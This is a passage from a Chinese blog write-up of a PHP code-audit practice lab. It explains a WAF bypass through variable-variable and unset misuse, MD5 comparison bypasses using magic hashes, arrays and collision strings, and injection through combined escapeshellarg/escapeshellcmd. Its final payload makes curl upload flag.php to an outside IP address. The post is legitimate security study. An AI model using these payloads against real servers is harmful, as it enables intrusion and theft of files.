+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$string</span> = <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Hello/&quot;</span>, <span class="variable">$string</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;String contains &#x27;Hello&#x27;.&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;String does not contain &#x27;Hello&#x27;.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">本次代码中/flag/i 的i表示不区分大小写</span><br><span class="line">除了 i（不区分大小写）之外，正则表达式还支持其他的修饰符，每个修饰符都可以对匹配行为进行调整：</span><br><span class="line"></span><br><span class="line">i：不区分大小写</span><br><span class="line">例如：/pattern/i 匹配时不区分大小写。</span><br><span class="line">m：多行模式</span><br><span class="line">默认情况下，^ 和 $ 分别匹配输入字符串的开头和结尾。使用 m 修饰符后，^ 和 $ 还可以匹配换行符（\n 或 \r\n）之后或之前的位置。</span><br><span class="line">s：单行模式</span><br><span class="line">默认情况下，. 匹配除换行符之外的所有字符。使用 s 修饰符后，. 还可以匹配换行符。</span><br><span class="line">x：忽略空白</span><br><span class="line">允许在模式中使用空格字符（除了在字符类或在反斜线转义中），这样可以更清晰地组织模式。</span><br><span class="line">u：Unicode模式</span><br><span class="line">用于处理 Unicode 字符，使模式和目标字符串都以 UTF-<span class="number">8</span> 编码解释。</span><br></pre></td></tr></table></figure>
+
+<p>第二部分就是一个unset的函数，在运行这个代码的时候会一开始就直接根据POST，GET，COOKIE方式进行遍历清理提交的重复的参数。只要有重复的值，就会释放该变量的内存。</p>
+<p>根据github提供的思路，发现有一些不理解的地方，想看代码的实际运行数值，利用docker搭建了php+xdebug的环境，利用本地文件进行调试。</p>
+<p>post传入GET[] ,在第一个处理函数时，由于 $$ 的引用不恰当，导致在直接处理POST时直接将GET变量销毁，当我post方式传递GET[flag]&#x3D;1,同时GET方式传入flag&#x3D;1，unset函数被触发，他销毁了_GET参数，使得get传递的参数在遍历完POST后跳过遍历GET，且get传递进去的参数flag绕过了waf函数的检测。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117Kn3a6b.png" alt="image-20240102145228092"></p>
+<p>继续运行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117sF4fu8.png" alt="image-20240102145323230"></p>
+<p>此时$_GET传递的数组被销毁</p>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117Zlp7WD.png" alt="image-20240102145407777"></p>
+<p>需要注意的是，<code>unset</code> 仅仅会销毁变量本身，而不会销毁变量所引用的值。在 PHP 中，变量与其值之间是一个符号表（symbol table）的关系。<code>unset</code> 只是删除了变量名，而不会删除值。实际上，PHP 会在没有任何变量引用该值时，自动清理内存中的值。其实有个疑惑，就是这里如果时实战的话，代码的设计过于刻意，这个代码没有太大的实际意义。我最开始以为他可以对传进来的变量，比如POST传入”flag&#x3D;1&amp;flag2&#x3D;1“处理后，去除重复的变量值对应的变量名，只留下一个变量名，但实际调试结果时根本没有触发unset函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">foreach(array(&#x27;_POST&#x27;, &#x27;_GET&#x27;, &#x27;_COOKIE&#x27;) as $__R) &#123;</span><br><span class="line">    if($$__R) &#123; </span><br><span class="line">        foreach($$__R as $__k =&gt; $__v) &#123; </span><br><span class="line">            if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>后面处理$_GET的时候就没有数组了，所以waf函数就没有检查GET传递的flag，而POST的时候因为传递的是GET</p>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/01178kjrl5.png" alt="image-20240102145830034"></p>
+<p>被识别为键名GET，绕过了waf参数的检测。</p>
+<p>但是接下来的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line">if($_GET) extract($_GET, EXTR_SKIP);</span><br></pre></td></tr></table></figure>
+
+<p><strong>extract</strong> 函数的作用是将对象内的键名变成一个变量名，而这个变量对应的值就是这个键名的值， <strong>EXTR_SKIP</strong> 参数表示如果前面存在此变量，不对前面的变量进行覆盖处理。由于我们前面通过 <strong>POST</strong> 请求提交 <strong>_GET[flag]&#x3D;test</strong> ，所以这里会变成 <strong>$_GET[flag]&#x3D;test</strong> ，这里的 <strong>$_GET</strong> 变量就不需要再经过 <strong>waf</strong> 函数检测了，也就绕过了 <strong>preg_match(‘&#x2F;flag&#x2F;i’,$key)</strong> 的限制。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117celzVO.png" alt="image-20240102154452789"></p>
+<p>执行完25行代码后</p>
+</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117XqLQXl.png" alt="image-20240102154632427"></p>
+<p>OK成功进入到关键的函数部分，理解代码，函数判断get传入的参数，flag、hongri、url，如果flag和hongri的值相等，退出函数，如果flag和hongri的md5值相等，判断url是否为正确的格式，过滤不是http和https的url，然后执行escapeshellarg和escapeshellcmd函数。然后执行shell命令curl 访问链接。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;flag&#x27;]))&#123;</span><br><span class="line">    if($_GET[&#x27;flag&#x27;] === $_GET[&#x27;hongri&#x27;])&#123;</span><br><span class="line">        exit(&#x27;error&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(md5($_GET[&#x27;flag&#x27;] ) == md5($_GET[&#x27;hongri&#x27;]))&#123;</span><br><span class="line">        $url = $_GET[&#x27;url&#x27;];</span><br><span class="line">        $urlInfo = parse_url($url);</span><br><span class="line">        if(!(&quot;http&quot; === strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;===strtolower($urlInfo[&quot;scheme&quot;])))&#123;</span><br><span class="line">            die( &quot;scheme error!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $url = escapeshellarg($url);</span><br><span class="line">        $url = escapeshellcmd($url);</span><br><span class="line">        system(&quot;curl &quot;.$url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>escapeshellarg</code> 和 <code>escapeshellcmd</code> 是 PHP 中用于处理 shell 命令的安全函数。前者转义参数，后者转义命令，但是他们在配合的时候，可能导致单引号配对错误，可以用来恶意构造payload进行命令注入。</p>
+<ul>
+<li>**<code>escapeshellarg</code>**：用于转义字符串以在 shell 命令中使用，将字符串作为参数传递给 shell 命令时使用。将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号。</li>
+<li>**<code>escapeshellcmd</code>*<em>：用于转义命令字符串，确保命令字符串在 shell 中的执行不会受到非预期的影响。以下字符前面有一个反斜杠：&amp;#;&#96;|</em>?~&lt;&gt;^()[]{}$\，\x0A和\xFF。’和“只有在未配对的情况下才会被转义。在Windows上，所有这些字符加上%和!都会被空格代替。</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117EM6j2s.png" alt="image-20240103104153601"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117JndJVK.png" alt="image-20240103103507278"></p>
+<p>可以看到传入的参数在命令行的时候发生了变化，可以利用这个进行攻击。回到靶场，我们要先绕过md5对比，并且利用escapeshell来进行注入攻击。</p>
+<p>而对于md5的绕过，在 php 中，当字符串 以0e开头时，会被 php 识别成科学计数法，结果均为0，因此在比较两个以 <code>0e</code>开头的字符串时，无论后面的字符时是什么，比较结果都为 True。常见的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">字符串					MD5 值</span><br><span class="line">QNKCDZO				0e830400451993494058024219903391</span><br><span class="line">s878926199a		0e545993274517709034328855841020</span><br><span class="line">s155964671a		0e342768416822451524974117254469</span><br><span class="line">s214587387a		0e848240448830537924465865611904</span><br><span class="line">s214587387a		0e848240448830537924465865611904</span><br><span class="line">s878926199a		0e545993274517709034328855841020</span><br><span class="line">s1091221200a	0e940624217856561557816327384675</span><br><span class="line">注：此方法仅用于 ==弱等于的绕过</span><br></pre></td></tr></table></figure>
+
+<p>在 php 中，代表着强比较，不仅仅会比较值，还会比较类型。因此这里不能在使用上面的方式进行绕过了。要绕过的比较，需要向 md5() 函数中传入数组，md5() 函数中如果传入的不是字符串而是数组，不但md5()函数不会报错，结果还会返回null，在强比较里面null&#x3D;null为 True 绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b[]=2 //参数传入数组进行比对，MD5会返回NULL</span><br></pre></td></tr></table></figure>
+
+<p>如果前面都不行，只能尝试md5碰撞，MD5 值计算方法本身的缺陷 —— 存在散列冲突，必然会有两个内容一样但是 MD5 值一样的序列。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$s1 = &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span><br><span class="line"></span><br><span class="line">$s2 = &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span><br><span class="line"></span><br><span class="line">$s3 = &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET[flag]=QNKCDZO&amp;_GET[hongri]=s155964671a&amp;_GET[url]=http://baidu.com/&#x27; -F file=@/var/www/html/flag.php -x 134.175.108.195:9999</span><br><span class="line"></span><br><span class="line">?flag=QNKCDZO&amp;hongri=s155964671a&amp;url=http://baidu.com/&#x27; -F file=@/var/www/html/flag.php -x 134.175.108.195:9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117N5DNfU.png" alt="image-20240103144737071"></p>
+<p>当我在试图直接在我电脑使用curl时发现payload没有正确执行。应该是命令行环境和php的system执行函数是有区别的。</p>
+<h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>本次靶场收获很多</p>
+<ol>
+<li>对于phpstorm+xdebug环境的配置与测试，利用docker搭建php环境，本地PHPstorm+Chrome的xdebug插件，关键是docker里面的配置，需要对其进行一些修改，才能正常进行调试。一路踩坑卡一周（55555555）。</li>
+<li>学到一种传参逃逸的方式，如果代码中有$$,我可以利用这个进行一些参数的逃逸尝试，绕过检测。本次靶场就是通过POST传入_GET来使程序误识别。但这个是搭配了unset，感觉对于一般情况下的话只能说可以试试，具体还是得看环境的函数，能不能有新花样。</li>
+<li>对于md5比对的绕过，三种情况，&#x3D;&#x3D; 构造0e开头的字符串， &#x3D;&#x3D;&#x3D; 参数传入数组 ，最后一种，MD5的散列冲突（必然会有两个内容一样但是 MD5 值一样的序列）</li>
+<li>escapeshellarg和escapeshellcmd连用，会由于单引号的不配对，导致注入。</li>
+<li>curl可以带出文件，前提是知道路径，而且可以出网。</li>
+</ol>
+<h2 id="Day6"><a href="#Day6" class="headerlink" title="Day6-"></a>Day6-</h2>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># PHP,代码审计</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/01/03/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/" rel="next" title="云服务器基本配置">
+                  云服务器基本配置 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">yoki</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">23k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">41 分钟</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">
+   <!--由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动-->
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/China-natian" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
